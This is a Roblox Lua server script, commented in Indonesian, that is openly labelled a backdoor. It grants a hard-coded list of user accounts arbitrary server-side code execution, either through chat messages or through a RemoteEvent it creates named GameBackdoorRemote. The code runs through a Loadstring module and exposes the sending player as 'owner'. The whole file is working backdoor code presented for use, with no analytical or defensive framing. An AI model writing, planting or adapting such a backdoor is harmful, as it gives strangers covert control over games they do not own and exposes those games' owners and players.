-- Pintu belakang untuk orang keren (Langsung Eksekusi via Chat & Remote)
-- Dibuat oleh MrMadMan (interpreterK)
-- Cara menggunakan (Chat): Langsung ketik skrip di chat (tanpa /e)
-- Cara menggunakan (Remote): GameBackdoorRemote:FireServer([skrip])

local Akses = {
    "interpreterK",
    "MrMadMan139",
    --akun alternatif saya
    "realwar2d",
    "B01RING",
    --milikmu
    "putra_mahesa1"
}

-- Fungsi utama untuk mengeksekusi kode
local function EksekusiSkrip(kode, P)
    local sukses, pesan = pcall(function()
        local ls = require(script.Loadstring)
        -- Menambahkan dukungan pemilik agar bisa menggunakan owner.Name, owner.UserId, dll
        local sumber = ls(kode, setmetatable({owner = P}, {
            __index = function(self, v)
                return rawget(self, v) or getfenv()[v]
            end,
            __newindex = function(self, i, v)
                getfenv()[i] = v
            end,
            __metatable = nil
        }))
        return sumber()
    end)
    
    if not sukses then
        warn("Kesalahan eksekusi skrip pintu belakang: " .. tostring(pesan))
    end
end

-- Membuat RemoteEvent secara otomatis jika belum ada di dalam skrip
local RemoteBackdoor = script:FindFirstChild("GameBackdoorRemote")
if not RemoteBackdoor then
    RemoteBackdoor = Instance.new("RemoteEvent")
    RemoteBackdoor.Name = "GameBackdoorRemote"
    RemoteBackdoor.Parent = script
end

-- Menangani eksekusi via RemoteEvent (Akses Jarak Jauh)
RemoteBackdoor.OnServerEvent:Connect(function(P, kode)
    -- Memeriksa apakah pemain yang mengirim request ada dalam daftar akses
    local diizinkan = false
    for i = 1, #Akses do
        if P.Name == Akses[i] then
            diizinkan = true
            break
        end
    end
    
    if diizinkan and type(kode) == "string" then
        EksekusiSkrip(kode, P)
    end
end)

-- Menangani eksekusi via Chat di dalam game (Langsung Eksekusi)
game:GetService("Players").PlayerAdded:Connect(function(P)
    local diizinkan = false
    for i = 1, #Akses do
        if P.Name == Akses[i] then
            diizinkan = true
            break
        end
    end
    
    if diizinkan then
        P.Chatted:Connect(function(str)
            -- Memastikan teks yang dikirim tidak kosong dan langsung mengeksekusinya
            if str and str ~= "" then
                EksekusiSkrip(str, P)
            end
        end)
    end
end)
